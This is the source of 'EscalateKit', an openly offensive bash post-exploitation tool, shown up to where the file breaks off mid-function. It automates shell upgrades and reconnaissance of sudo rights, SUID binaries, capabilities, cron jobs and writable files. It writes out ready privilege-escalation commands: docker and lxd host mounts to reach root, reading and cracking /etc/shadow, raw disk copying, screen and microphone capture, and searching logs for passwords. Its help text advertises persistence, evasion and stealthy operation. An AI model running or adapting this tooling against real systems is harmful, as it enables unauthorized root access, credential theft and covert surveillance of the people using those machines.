#!/bin/bash
# EscalateKit: Post-Exploitation Automation Tool
# A comprehensive tool for privilege escalation and system reconnaissance
# Version: 1.0

# ----------------------------------------------------------------------
# Global Variables
# ----------------------------------------------------------------------
PROGRAM_NAME=$(basename "$0")
VERSION="1.0"
LOG_DIR="/tmp/.escalatekit_logs"
DEFAULT_OUTPUT_DIR="/tmp/.escalatekit_results"
OUTPUT_DIR="$DEFAULT_OUTPUT_DIR"
LOGFILE="$LOG_DIR/history.log"
VERBOSE=false
PARALLEL_MODE=""
EXPORT_FORMAT=""
MODULES_TO_RUN="all"
QUIET_MODE=false
TARGET_DIR=""
GTFOBINS_DATA="/tmp/.gtfobins_data"

# ----------------------------------------------------------------------
# Error Codes
# ----------------------------------------------------------------------
E_SUCCESS=0
E_OPTION_NOT_EXIST=100
E_MISSING_PARAM=101
E_PERMISSION_DENIED=102
E_DIR_NOT_EXIST=103
E_FILE_NOT_EXIST=104
E_INVALID_FORMAT=105
E_MODULE_FAILED=106
E_CONNECTION_FAILED=107

# ----------------------------------------------------------------------
# Utility Functions
# ----------------------------------------------------------------------

# Function to display a loading animation
show_loading() {
    local pid=$1
    local message=$2
    local i=0
    local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')

    # Only show animation if not in quiet mode
    if [ "$QUIET_MODE" = false ]; then
        while kill -0 $pid 2>/dev/null; do
            local spin_char="${spinner[$i]}"
            printf "\r\e[36m$spin_char\e[0m $message..."
            i=$(((i + 1) % ${#spinner[@]}))
            sleep 0.1
        done
        printf "\r\e[32m✓\e[0m $message... Done\n"
    fi
}

# Function to log messages to both console and log file
log_message() {
    local level="$1"
    local message="$2"
    local timestamp
    timestamp=$(date +"%Y-%m-%d-%H-%M-%S")
    local username
    username=$(whoami)

    # Create the log directory if it doesn't exist
    if [ ! -d "$LOG_DIR" ]; then
        mkdir -p "$LOG_DIR" 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "Cannot create log directory: $LOG_DIR" >&2
            return 1
        fi
    fi

    # Log to file
    echo "$timestamp : $username : $level : $message" >>"$LOGFILE"

    # Display to console if not in quiet mode - with improved formatting
    if [ "$QUIET_MODE" = false ]; then
        if [ "$level" = "ERROR" ]; then
            echo -e "\e[31m[ERROR]\e[0m $message" >&2 # Red for errors
        elif [ "$level" = "WARN" ]; then
            echo -e "\e[33m[WARN]\e[0m $message" # Yellow for warnings
        elif [ "$level" = "INFOS" ]; then
            if [ "$VERBOSE" = true ]; then
                echo -e "\e[32m[INFO]\e[0m $message" # Green for info
            fi
        else
            # For normal output, just print the message
            echo "$message"
        fi
    fi
}

check_current_privileges() {
    local current_user=$(whoami)
    local current_uid=$(id -u)

    if [ "$QUIET_MODE" = false ]; then
        echo -e "\e[33m[*] Current User Context:\e[0m"
        echo -e "    User: $current_user"
        echo -e "    UID: $current_uid"

        if [ "$current_uid" -eq 0 ]; then
            echo -e "\e[31m[!] Already running as root - privilege escalation not needed\e[0m"
            echo -e "    This tool is designed for escalating FROM unprivileged users TO root"
        else
            echo -e "\e[32m[+] Running as unprivileged user - perfect for privilege escalation\e[0m"
        fi
        echo ""
    fi

    # Log the current context
    log_message "INFOS" "Starting EscalateKit as user: $current_user (UID: $current_uid)"
}

# Function to display help
display_help() {
    cat <<EOF
NAME
    $PROGRAM_NAME - Post-Exploitation Automation Tool

SYNOPSIS
    $PROGRAM_NAME [OPTIONS] [DIRECTORY]

DESCRIPTION
    A comprehensive tool for privilege escalation, system reconnaissance,
    and post-exploitation activities on Linux systems. Helps identify 
    potential privilege escalation vectors and establish persistence.

OPTIONS
    -h, --help          Display this help message and exit
    -f, --fork          Execute modules using fork processes for parallel execution
    -t, --thread        Execute modules using threads for parallel execution
    -s, --subshell      Execute modules in a subshell (isolated environment)
    -l, --log DIR       Specify a custom directory for log files
    -r, --restore       Clean up artifacts and restore altered configurations
    -v, --verbose       Enable verbose output mode
    -m, --modules LIST  Specify modules to run (shell,recon,exploit,persist,evade)
    -o, --output FORMAT Export results in specified format (json,html,csv)
    -q, --quiet         Minimal output for stealthy operation

MODULES
    shell   - Upgrades and stabilizes the current shell
    recon   - Gathers system information for privilege escalation
    exploit - Suggests and provides templates for exploitation
    persist - Establishes persistence mechanisms
    evade   - Implements evasion techniques

EXAMPLES
    $PROGRAM_NAME -h
        Display help message

    $PROGRAM_NAME -t -m recon
        Run reconnaissance module using threads with default output

    $PROGRAM_NAME -f -l /tmp/.hidden -m shell,exploit
        Run shell and exploit modules using fork with hidden log directory

    $PROGRAM_NAME -s -m persist -q
        Run persistence module in a subshell with minimal output

EXIT CODES
    0   Success
    100 Option not found
    101 Missing required parameter
    102 Permission denied
    103 Directory does not exist
    104 File does not exist
    105 Invalid format
    106 Module execution failed
    107 Connection failed

AUTHOR
    K4YR0

COPYRIGHT
    Copyright © 2025 K4YR0. All rights reserved.
EOF
}

# ----------------------------------------------------------------------
# Shell Enhancement Module
# ----------------------------------------------------------------------

shell_upgrade() {
    log_message "INFOS" "Starting shell upgrade module"

    mkdir -p "$OUTPUT_DIR/shell"
    local output_file="$OUTPUT_DIR/shell/upgrade_options.txt"

    # Check available interpreters
    echo "--- Available Shell Upgrade Methods ---" >"$output_file"

    # Python TTY
    if command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
        echo "[+] Python TTY Upgrade Available:" >>"$output_file"
        if command -v python >/dev/null 2>&1; then
            echo "    python -c 'import pty; pty.spawn(\"/bin/bash\")'" >>"$output_file"
        fi
        if command -v python3 >/dev/null 2>&1; then
            echo "    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" >>"$output_file"
        fi
    fi

    # Perl TTY
    if command -v perl >/dev/null 2>&1; then
        echo "[+] Perl TTY Upgrade Available:" >>"$output_file"
        echo "    perl -e 'exec \"/bin/bash\";'" >>"$output_file"
    fi

    # Ruby TTY
    if command -v ruby >/dev/null 2>&1; then
        echo "[+] Ruby TTY Upgrade Available:" >>"$output_file"
        echo "    ruby -e 'exec \"/bin/bash\"'" >>"$output_file"
    fi

    # Full TTY Stabilization Steps
    echo -e "\n--- Full TTY Stabilization ---" >>"$output_file"
    echo "After running the above commands, execute these steps:" >>"$output_file"
    echo "1. ^Z (background the shell)" >>"$output_file"
    echo "2. stty raw -echo; fg" >>"$output_file"
    echo "3. reset" >>"$output_file"
    echo "4. export TERM=xterm" >>"$output_file"
    echo "5. stty rows 38 columns 116" >>"$output_file"

    log_message "INFOS" "Shell upgrade options saved to $output_file"

    # Offer to attempt automatic upgrade if not in quiet mode
    if [ "$QUIET_MODE" = false ]; then
        echo -e "\n[*] Shell Upgrade Options:"
        cat "$output_file"

        echo -e "\n[?] Would you like to attempt an automatic shell upgrade? (y/n)"
        read -r response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            echo "[*] Attempting Python TTY upgrade..."
            if command -v python3 >/dev/null 2>&1; then
                python3 -c 'import pty; pty.spawn("/bin/bash")'
            elif command -v python >/dev/null 2>&1; then
                python -c 'import pty; pty.spawn("/bin/bash")'
            elif command -v perl >/dev/null 2>&1; then
                perl -e 'exec "/bin/bash";'
            else
                echo "[-] No suitable interpreters found for automatic upgrade."
            fi
        fi
    fi

    return 0
}

# ----------------------------------------------------------------------
# Reconnaissance Module
# ----------------------------------------------------------------------

recon_system_info() {
    log_message "INFOS" "Gathering basic system information"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/system_info.txt"

    # System information
    echo "--- System Information ---" >"$output_file"
    echo "Hostname: $(hostname 2>/dev/null)" >>"$output_file"
    echo "Kernel: $(uname -a 2>/dev/null)" >>"$output_file"
    echo "OS: $(cat /etc/issue 2>/dev/null | head -n 1 | awk '{print $1,$2,$3}')" >>"$output_file"

    # Current user context
    echo -e "\n--- User Context ---" >>"$output_file"
    echo "Current User: $(whoami 2>/dev/null)" >>"$output_file"
    echo "Current ID: $(id 2>/dev/null)" >>"$output_file"
    echo "Login Shell: $SHELL" >>"$output_file"

    # List all users
    echo -e "\n--- All Users ---" >>"$output_file"
    cat /etc/passwd | cut -d: -f1 2>/dev/null >>"$output_file"

    # Mounted filesystems
    echo -e "\n--- Mounted Filesystems ---" >>"$output_file"
    mount 2>/dev/null >>"$output_file"

    log_message "INFOS" "Basic system information saved to $output_file"
    return 0
}

recon_network() {
    log_message "INFOS" "Gathering network information"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/network_info.txt"

    # Network interfaces
    echo "--- Network Interfaces ---" >"$output_file"
    ip a 2>/dev/null >>"$output_file" || ifconfig 2>/dev/null >>"$output_file"

    # Network connections
    echo -e "\n--- Network Connections ---" >>"$output_file"
    netstat -tuln 2>/dev/null >>"$output_file" || ss -tuln 2>/dev/null >>"$output_file"

    # ARP table - Enhanced detection
    echo -e "\n--- ARP Table ---" >>"$output_file"
    {
        ip neigh show 2>/dev/null ||      # Modern Linux
            arp -a 2>/dev/null ||         # BSD-style (macOS, older Linux)
            arp -n 2>/dev/null ||         # Traditional Linux
            cat /proc/net/arp 2>/dev/null # Raw ARP table
    } >>"$output_file"

    # Routing table
    echo -e "\n--- Routing Table ---" >>"$output_file"
    route -n 2>/dev/null >>"$output_file" || ip route 2>/dev/null >>"$output_file"

    # Firewall rules
    echo -e "\n--- Firewall Rules ---" >>"$output_file"
    if command -v iptables >/dev/null 2>&1; then
        iptables -L 2>/dev/null >>"$output_file"
    elif command -v ufw >/dev/null 2>&1; then
        ufw status 2>/dev/null >>"$output_file"
    fi

    # Outbound connectivity test
    echo -e "\n--- Outbound Connectivity ---" >>"$output_file"
    ping -c 1 8.8.8.8 >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Outbound ICMP traffic is allowed" >>"$output_file"
    else
        echo "[-] Outbound ICMP traffic might be blocked" >>"$output_file"
    fi

    log_message "INFOS" "Network information saved to $output_file"
    return 0
}

recon_sudo_privileges() {
    log_message "INFOS" "Checking for sudo privileges"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/sudo_privs.txt"

    echo "--- Sudo Privileges Check ---" >"$output_file"
    echo "Generated on: $(date)" >>"$output_file"
    echo "User: $(whoami)" >>"$output_file"
    echo "Hostname: $(hostname)" >>"$output_file"
    echo -e "\n" >>"$output_file"

    # Check sudo command exists
    if ! command -v sudo &>/dev/null; then
        echo "[-] sudo command not found" >>"$output_file"
        log_message "WARN" "sudo command not found"
        return 1
    fi

    # Check sudo privileges
    echo "--- Sudo Access Check ---" >>"$output_file"

    if sudo -n true 2>/dev/null; then
        echo "[+] Passwordless sudo access available" >>"$output_file"
        sudo_output=$(sudo -l 2>/dev/null)
        echo "--- Raw sudo -l output ---" >>"$output_file"
        echo "$sudo_output" >>"$output_file"
        echo "--- End of raw output ---" >>"$output_file"

        # Check for GTFOBins matches
        echo -e "\n--- Potential Privilege Escalation via Sudo ---" >>"$output_file"

        # Check for the specific "(ALL : ALL) ALL" case first
        if echo "$sudo_output" | grep -q "(ALL : ALL) ALL\|(ALL) ALL"; then
            echo "[!] CRITICAL: User has full sudo access - (ALL : ALL) ALL" >>"$output_file"
            echo "    This means the user can run ANY command as root with sudo" >>"$output_file"
            echo "    Simply run: sudo su -" >>"$output_file"
            echo "    Or: sudo /bin/bash" >>"$output_file"
            echo "    Or: sudo -i" >>"$output_file"
            echo "" >>"$output_file"
        fi

        # Parse sudo -l output line by line with improved parsing
        echo "$sudo_output" | while IFS= read -r line; do
            # Skip empty lines and headers
            if [[ -z "$line" || "$line" =~ ^[[:space:]]*$ ]]; then
                continue
            fi

            if [[ "$line" =~ ^"Matching Defaults entries" ]]; then
                continue
            fi

            if [[ "$line" =~ ^"User $(whoami) may run" ]]; then
                continue
            fi

            # Check for (ALL : ALL) ALL pattern
            if [[ "$line" =~ \(ALL[[:space:]]*:[[:space:]]*ALL\)[[:space:]]+ALL ]]; then
                echo "[!] CRITICAL: Full sudo access found on line: $line" >>"$output_file"
                continue
            fi

            # Look for lines containing executable paths
            if [[ "$line" =~ \(.*\)[[:space:]]+/.* ]]; then
                echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                    if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                        binary_name=$(basename "$binary_path")
                        echo "[*] Found sudo permission for: $binary_path" >>"$output_file"
                        check_gtfobins "$binary_name" "sudo" >>"$output_file"
                        echo "" >>"$output_file"
                    fi
                done
            elif [[ "$line" =~ ^[[:space:]]+/.* ]]; then
                echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                    if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                        binary_name=$(basename "$binary_path")
                        echo "[*] Found sudo permission for: $binary_path" >>"$output_file"
                        check_gtfobins "$binary_name" "sudo" >>"$output_file"
                        echo "" >>"$output_file"
                    fi
                done
            elif [[ "$line" =~ \(.*\)[[:space:]]+[^/] ]]; then
                # Extract commands that don't start with /
                commands=$(echo "$line" | sed 's/^[^)]*)[[:space:]]*//' | tr ',' '\n')
                echo "$commands" | while read -r cmd; do
                    cmd=$(echo "$cmd" | xargs) # trim whitespace
                    if [[ -n "$cmd" && "$cmd" != "ALL" ]]; then
                        echo "[*] Found sudo permission for command: $cmd" >>"$output_file"
                        # Try to get just the binary name
                        binary_name=$(echo "$cmd" | awk '{print $1}')
                        if [[ -n "$binary_name" ]]; then
                            check_gtfobins "$binary_name" "sudo" >>"$output_file"
                        fi
                        echo "" >>"$output_file"
                    fi
                done
            fi
        done

        # Additional check for common dangerous sudo permissions
        echo -e "\n--- Common Dangerous Sudo Permissions ---" >>"$output_file"
        dangerous_binaries=("vi" "vim" "nano" "emacs" "less" "more" "man" "awk" "find" "nmap" "python" "python3" "perl" "ruby" "bash" "sh" "nc" "netcat" "socat" "wget" "curl" "tar" "zip" "unzip" "git" "ftp" "ssh" "scp" "rsync" "mount" "umount" "chmod" "chown" "cp" "mv" "dd" "systemctl" "service" "su")

        for binary in "${dangerous_binaries[@]}"; do
            if echo "$sudo_output" | grep -q "/$binary\|[[:space:]]$binary[[:space:]]\|[[:space:]]$binary$\|^$binary[[:space:]]\|^$binary$"; then
                echo "[!] CRITICAL: Found sudo access to $binary" >>"$output_file"
                check_gtfobins "$binary" "sudo" >>"$output_file"
                echo "" >>"$output_file"
            fi
        done

    else
        echo "[!] sudo requires password" >>"$output_file"

        # Use the environment variable set by run_module function
        password_choice="${RECON_PASSWORD_AVAILABLE:-no}"
        user_password="${RECON_USER_PASSWORD:-}"

        case "$password_choice" in
        "yes")
            echo "[*] User indicated password is available - attempting sudo enumeration" >>"$output_file"
            echo "[*] Attempting 'sudo -l' with provided password..." >>"$output_file"

            if [ -n "$user_password" ]; then
                # Use the stored password with sudo -S (stdin)
                sudo_output=$(echo "$user_password" | timeout 30 sudo -S -l 2>/dev/null)
                sudo_exit_code=$?

                if [ $sudo_exit_code -eq 0 ] && [ -n "$sudo_output" ]; then
                    echo "--- Raw sudo -l output (with password) ---" >>"$output_file"
                    echo "$sudo_output" >>"$output_file"
                    echo "--- End of raw output ---" >>"$output_file"

                    echo -e "\n--- Potential Privilege Escalation via Sudo ---" >>"$output_file"

                    # Check for (ALL : ALL) ALL case
                    if echo "$sudo_output" | grep -q "(ALL : ALL) ALL\|(ALL) ALL"; then
                        echo "[!] CRITICAL: User has full sudo access - (ALL : ALL) ALL" >>"$output_file"
                        echo "    This means the user can run ANY command as root with sudo" >>"$output_file"
                        echo "    Simply run: sudo su -" >>"$output_file"
                        echo "" >>"$output_file"
                    fi

                    # Same parsing logic as passwordless sudo
                    echo "$sudo_output" | while IFS= read -r line; do
                        [[ -z "$line" || "$line" =~ ^[[:space:]]*$ ]] && continue
                        [[ "$line" =~ ^"Matching Defaults entries" ]] && continue
                        [[ "$line" =~ ^"User $(whoami) may run" ]] && continue

                        if [[ "$line" =~ \(.*\)[[:space:]]+/.* ]]; then
                            echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                                if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                                    binary_name=$(basename "$binary_path")
                                    echo "[*] Found sudo permission for: $binary_path" >>"$output_file"
                                    check_gtfobins "$binary_name" "sudo" >>"$output_file"
                                    echo "" >>"$output_file"
                                fi
                            done
                        elif [[ "$line" =~ ^[[:space:]]+/.* ]]; then
                            echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                                if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                                    binary_name=$(basename "$binary_path")
                                    echo "[*] Found sudo permission for: $binary_path" >>"$output_file"
                                    check_gtfobins "$binary_name" "sudo" >>"$output_file"
                                    echo "" >>"$output_file"
                                fi
                            done
                        fi
                    done

                    if [ "$QUIET_MODE" = false ]; then
                        echo -e "\e[32m[+] Successfully enumerated sudo privileges with password\e[0m"
                    fi
                else
                    if [ $sudo_exit_code -eq 124 ]; then
                        echo "[-] Sudo password prompt timed out after 30 seconds" >>"$output_file"
                        if [ "$QUIET_MODE" = false ]; then
                            echo -e "\e[31m[-] Password prompt timed out\e[0m"
                        fi
                    elif [ $sudo_exit_code -eq 1 ]; then
                        echo "[-] Incorrect password or sudo access denied" >>"$output_file"
                        if [ "$QUIET_MODE" = false ]; then
                            echo -e "\e[31m[-] Incorrect password or access denied\e[0m"
                        fi
                    else
                        echo "[-] Failed to check sudo privileges (exit code: $sudo_exit_code)" >>"$output_file"
                    fi
                fi
            else
                echo "[-] No password provided" >>"$output_file"
            fi
            ;;
        "auto")
            echo "[*] Auto-attempting sudo -l (non-interactive)..." >>"$output_file"

            # Try a non-interactive sudo check first
            if timeout 5 sudo -n -l >/dev/null 2>&1; then
                # Passwordless sudo is actually available
                sudo_output=$(sudo -l 2>/dev/null)
                echo "--- Auto-discovered sudo permissions ---" >>"$output_file"
                echo "$sudo_output" >>"$output_file"
            else
                # Try with a very short timeout to see if password is cached
                sudo_output=$(timeout 3 bash -c 'echo "" | sudo -S -l' 2>/dev/null)
                if [ $? -eq 0 ] && [ -n "$sudo_output" ]; then
                    echo "--- Sudo permissions (cached password) ---" >>"$output_file"
                    echo "$sudo_output" >>"$output_file"
                else
                    echo "[-] Auto-attempt failed - password required and not cached" >>"$output_file"
                    echo "    Run with manual option to enter password" >>"$output_file"
                fi
            fi
            ;;
        *)
            echo "[-] Password not available - skipping password-protected sudo enumeration" >>"$output_file"
            echo "    Only passwordless sudo access was checked" >>"$output_file"
            ;;
        esac
    fi

    # Enhanced group checks with comprehensive analysis
    echo -e "\n--- User Group Memberships ---" >>"$output_file"
    current_groups=$(groups)
    echo "Current groups: $current_groups" >>"$output_file"

    echo -e "\n--- Privileged Group Analysis ---" >>"$output_file"
    privileged_groups=("sudo" "wheel" "admin" "adm" "docker" "lxd" "disk" "video" "audio" "shadow" "root" "lpadmin" "sambashare" "plugdev" "netdev" "kvm" "libvirt")

    for group in "${privileged_groups[@]}"; do
        if echo "$current_groups" | grep -qw "$group"; then
            echo "[+] Member of $group group - Potential escalation:" >>"$output_file"

            case $group in
            "docker")
                echo "  Command: docker run -v /:/mnt --rm -it alpine chroot /mnt sh" >>"$output_file"
                echo "  Reference: https://gtfobins.github.io/gtfobins/docker/" >>"$output_file"
                echo "  Explanation: Docker group members can mount host filesystem and escape container" >>"$output_file"
                ;;
            "lxd")
                echo "  Commands:" >>"$output_file"
                echo "    lxc init ubuntu:18.04 test -c security.privileged=true" >>"$output_file"
                echo "    lxc config device add test rootdisk disk source=/ path=/mnt/root recursive=true" >>"$output_file"
                echo "    lxc start test && lxc exec test /bin/bash" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" >>"$output_file"
                echo "  Explanation: LXD group members can create privileged containers" >>"$output_file"
                ;;
            "disk")
                echo "  Commands:" >>"$output_file"
                echo "    debugfs /dev/sda1" >>"$output_file"
                echo "    dd if=/dev/sda of=/tmp/disk.img" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group" >>"$output_file"
                echo "  Explanation: Direct access to disk devices, can read entire filesystem" >>"$output_file"
                ;;
            "shadow")
                echo "  Commands:" >>"$output_file"
                echo "    cat /etc/shadow" >>"$output_file"
                echo "    john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#shadow-group" >>"$output_file"
                echo "  Explanation: Can read /etc/shadow file containing password hashes" >>"$output_file"
                ;;
            "video")
                echo "  Commands:" >>"$output_file"
                echo "    cat /dev/fb0 > /tmp/screen.raw" >>"$output_file"
                echo "    ffmpeg -f fbdev -i /dev/fb0 screenshot.png" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group" >>"$output_file"
                echo "  Explanation: Access to framebuffer devices, can capture screen content" >>"$output_file"
                ;;
            "audio")
                echo "  Commands:" >>"$output_file"
                echo "    arecord -f cd -t wav /tmp/audio.wav" >>"$output_file"
                echo "    cat /dev/snd/* > /tmp/audio.raw" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#audio-group" >>"$output_file"
                echo "  Explanation: Access to audio devices, can record microphone input" >>"$output_file"
                ;;
            "adm")
                echo "  Commands:" >>"$output_file"
                echo "    find /var/log -readable 2>/dev/null | head -20" >>"$output_file"
                echo "    grep -r 'password\\|pass\\|pwd' /var/log/ 2>/dev/null" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#adm-group" >>"$output_file"
                echo "  Explanation: Read access to system logs, may contain sensitive information" >>"$output_file"
                ;;
            "root")
                echo "  Commands:" >>"$output_file"
                echo "    find / -group root -perm -g=w ! -type l -exec ls -ld {} + 2>/dev/null" >>"$output_file"
                echo "    find /etc -group root -writable 2>/dev/null" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >>"$output_file"
                echo "  Explanation: Check for group-writable files owned by root" >>"$output_file"
                ;;
            "kvm" | "libvirt")
                echo "  Commands:" >>"$output_file"
                echo "    virsh list --all" >>"$output_file"
                echo "    virsh edit [vm-name]" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#libvirt-group" >>"$output_file"
                echo "  Explanation: Control virtual machines, potential for VM escape" >>"$output_file"
                ;;
            "lpadmin")
                echo "  Commands:" >>"$output_file"
                echo "    cupsctl" >>"$output_file"
                echo "    lpstat -a" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lpadmin-group" >>"$output_file"
                echo "  Explanation: Printer administration, potential for command injection via print jobs" >>"$output_file"
                ;;
            "sambashare")
                echo "  Commands:" >>"$output_file"
                echo "    smbclient -L localhost" >>"$output_file"
                echo "    testparm" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >>"$output_file"
                echo "  Explanation: Samba share access, check for writable shares or config files" >>"$output_file"
                ;;
            "plugdev")
                echo "  Commands:" >>"$output_file"
                echo "    lsblk" >>"$output_file"
                echo "    mount /dev/sd* /mnt" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#plugdev-group" >>"$output_file"
                echo "  Explanation: Mount removable devices, potential access to external storage" >>"$output_file"
                ;;
            "netdev")
                echo "  Commands:" >>"$output_file"
                echo "    ip link show" >>"$output_file"
                echo "    iwconfig" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >>"$output_file"
                echo "  Explanation: Network device configuration, potential for network manipulation" >>"$output_file"
                ;;
            *)
                echo "  General admin privileges - investigate further" >>"$output_file"
                echo "  Check sudo -l for specific commands" >>"$output_file"
                echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >>"$output_file"
                ;;
            esac
            echo "" >>"$output_file"
        fi
    done

    log_message "INFOS" "Sudo privileges check saved to $output_file"
    return 0
}

recon_suid_files() {
    log_message "INFOS" "Searching for SUID files"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/suid_files.txt"

    echo "--- SUID Files ---" >"$output_file"

    echo "[*] Searching for SUID files (this may take a while)..." >>"$output_file"
    echo "[*] Note: Running as non-root user, some directories may not be accessible" >>"$output_file"

    # Search for SUID files with better error handling
    echo "[*] Starting SUID file search..." >>"$output_file"
    find / -type f -perm -4000 2>/dev/null >"/tmp/.suid_files.tmp"

    # Count found files
    suid_count=$(wc -l <"/tmp/.suid_files.tmp" 2>/dev/null || echo "0")
    echo "[*] Found $suid_count SUID files" >>"$output_file"

    # Check if we found any SUID files
    if [ -s "/tmp/.suid_files.tmp" ] && [ "$suid_count" -gt 0 ]; then
        echo -e "\n--- SUID Files List ---" >>"$output_file"
        # Get detailed info about each SUID file
        while read -r suid_file; do
            if [ -f "$suid_file" ]; then
                ls -la "$suid_file" 2>/dev/null >>"$output_file"
            fi
        done <"/tmp/.suid_files.tmp"

        # Extract binary names and check against GTFOBins
        echo -e "\n--- GTFOBins SUID Matches ---" >>"$output_file"
        found_exploitable=false
        while read -r suid_file; do
            if [ -f "$suid_file" ]; then
                binary_name=$(basename "$suid_file")
                if check_gtfobins "$binary_name" "suid" >>"$output_file"; then
                    found_exploitable=true
                fi
            fi
        done <"/tmp/.suid_files.tmp"

        if [ "$found_exploitable" = false ]; then
            echo "[-] No exploitable SUID binaries found in GTFOBins database" >>"$output_file"
            echo "    Tip: Check GTFOBins.github.io manually for less common binaries" >>"$output_file"
        fi
    else
        echo "[-] No SUID files found (or permission denied to all directories)" >>"$output_file"
        echo "    This is unusual - most Linux systems have some SUID binaries" >>"$output_file"
        echo "    Possible reasons:" >>"$output_file"
        echo "    - Very restrictive filesystem permissions" >>"$output_file"
        echo "    - Container environment with minimal binaries" >>"$output_file"
        echo "    - Custom security configuration" >>"$output_file"
    fi

    # Clean up
    rm -f "/tmp/.suid_files.tmp"

    log_message "INFOS" "SUID files check saved to $output_file"
    return 0
}

recon_capabilities() {
    log_message "INFOS" "Checking for capabilities"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/capabilities.txt"

    echo "--- Capabilities ---" >"$output_file"

    # Check if getcap is available
    if ! command -v getcap >/dev/null 2>&1; then
        echo "[-] getcap binary not found" >>"$output_file"
        log_message "WARN" "getcap binary not found"
        return 1
    fi

    # Find files with capabilities
    echo "[*] Searching for files with capabilities (this may take a while)..." >>"$output_file"
    cap_files=$(getcap -r / 2>/dev/null)

    if [ -n "$cap_files" ]; then
        echo "$cap_files" >>"$output_file"

        # Check for dangerous capabilities
        echo -e "\n--- Dangerous Capabilities ---" >>"$output_file"
        echo "$cap_files" | grep -E "cap_(setuid|setgid|net_raw|net_admin|sys_admin|sys_ptrace)" >>"$output_file" || echo "No dangerous capabilities found" >>"$output_file"
    else
        echo "[-] No files with capabilities found" >>"$output_file"
    fi

    log_message "INFOS" "Capabilities check saved to $output_file"
    return 0
}

recon_cron_jobs() {
    log_message "INFOS" "Checking for cron jobs"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/cron_jobs.txt"

    echo "--- Cron Jobs ---" >"$output_file"

    # System-wide cron jobs
    echo "[*] System-wide cron jobs:" >>"$output_file"
    ls -la /etc/cron* 2>/dev/null >>"$output_file"

    # crontab entries
    echo -e "\n[*] Crontab content:" >>"$output_file"
    cat /etc/crontab 2>/dev/null >>"$output_file"

    # User cron jobs
    if [ -d "/var/spool/cron/crontabs" ]; then
        echo -e "\n[*] User crontabs:" >>"$output_file"
        ls -la /var/spool/cron/crontabs 2>/dev/null >>"$output_file"
    fi

    # Check for writable cron job scripts
    echo -e "\n--- Writable Cron Scripts ---" >>"$output_file"
    cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -E "[0-9]+ [0-9]+ [0-9]+ [0-9]+ [0-9]+" | while read -r cron_line; do
        cmd=$(echo "$cron_line" | awk '{for(i=6;i<=NF;i++) print $i}' | tr ' ' ' ')
        script_path=$(echo "$cmd" | awk '{print $1}')
        if [ -f "$script_path" ] && [ -w "$script_path" ]; then
            echo "[+] Writable cron script found: $script_path" >>"$output_file"
        fi
    done

    log_message "INFOS" "Cron jobs check saved to $output_file"
    return 0
}

recon_writable_files() {
    log_message "INFOS" "Searching for interesting writable files"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/writable_files.txt"

    echo "--- Writable Files Recon Report ---" >"$output_file"
    echo "Generated on: $(date)" >>"$output_file"
    echo "Running as user: $(whoami)" >>"$output_file"
    echo "" >>"$output_file"
    echo "[*] Note: Running as non-root user, some directories may not be accessible" >>"$output_file"
    echo "" >>"$output_file"

    # Search for files writable by current user (ENHANCED)
    echo "[*] Searching for files writable by current user..." >>"$output_file"
    find / -type f -writable 2>/dev/null | grep -v -E "^/(proc|sys|dev|run)" | head -50 >>"$output_file"
    echo "" >>"$output_file"

    # Find world-writable files (ENHANCED - increased limit and better filtering)
    echo "[*] World-writable files (excluding common temp locations)..." >>"$output_file"
    find / -type f -perm -002 2>/dev/null | grep -v -E "^/(proc|sys|dev|run|tmp|var/tmp)" | head -50 >>"$output_file"
    echo "" >>"$output_file"

    # Find world-writable directories (ENHANCED - better description and filtering)
